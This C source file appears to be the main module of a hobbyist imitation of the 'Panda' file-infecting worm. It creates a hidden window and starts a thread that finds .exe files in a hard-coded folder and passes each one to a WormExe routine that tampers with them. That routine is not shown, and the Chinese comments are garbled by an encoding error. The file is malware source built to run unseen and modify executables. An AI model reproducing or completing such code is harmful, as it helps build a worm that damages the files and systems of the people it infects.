#include "Panda.h"
#include "resource.h"
#include "Global.h"



int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	TCHAR szAppClassName[] = TEXT("Panda");

	WNDCLASS wndClass;
	wndClass.cbClsExtra = 0;
	wndClass.cbWndExtra = 0; 
	wndClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	wndClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	wndClass.hIcon = LoadIcon(hInstance,MAKEINTRESOURCE(IDI_ICON1));
	wndClass.hInstance = hInstance;
	wndClass.lpfnWndProc = WindowsProc;
	wndClass.lpszClassName = szAppClassName;
	wndClass.lpszMenuName = NULL;
	wndClass.style = CS_VREDRAW | CS_HREDRAW;

	RegisterClass(&wndClass);

	HWND hWnd = CreateWindow(szAppClassName, TEXT("��è����"), WS_OVERLAPPEDWINDOW, 200, 100, 800, 600, NULL, NULL, hInstance, NULL);

	ShowWindow(hWnd, SW_HIDE);
	UpdateWindow(hWnd);

	MSG msg;
	while (GetMessage(&msg,NULL,0,0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}

//���ڴ�����
LRESULT CALLBACK WindowsProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	static HANDLE hPandaThread = NULL;

	switch (uMsg)
	{
	case WM_CREATE:
		//����һ���߳�
		hPandaThread = CreateThread(NULL, NULL, PandaProc, NULL, NULL, NULL);
		break;
	case WM_CLOSE:
		DestroyWindow(hWnd);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	}

	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}


//�̴߳�����
DWORD WINAPI PandaProc(LPVOID lpParam)
{
	TCHAR szFindPath[MAX_PATH] = TEXT("C:\\Users\\11413\\Desktop\\qqq");

	//���ҵ������ļ�
	WIN32_FIND_DATA FindFileData = { 0 };
	HANDLE hFinder = FindFirstFile(TEXT("C:\\Users\\11413\\Desktop\\qqq\\*.exe"), &FindFileData);

	if (hFinder == INVALID_HANDLE_VALUE)
		return 0;

	while (TRUE)
	{
		//���Ϊ�ļ�
		if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
		{
			TCHAR szExePath[MAX_PATH];
			sprintf(szExePath, TEXT("%s\\%s"), szFindPath, FindFileData.cFileName);

			//�޸�ָ��EXE��ִ���ļ���ͼ��
			WormExe(szExePath);
		}		
		if (!FindNextFile(hFinder, &FindFileData))
			break;

	}
	FindClose(hFinder);

	return 0;
}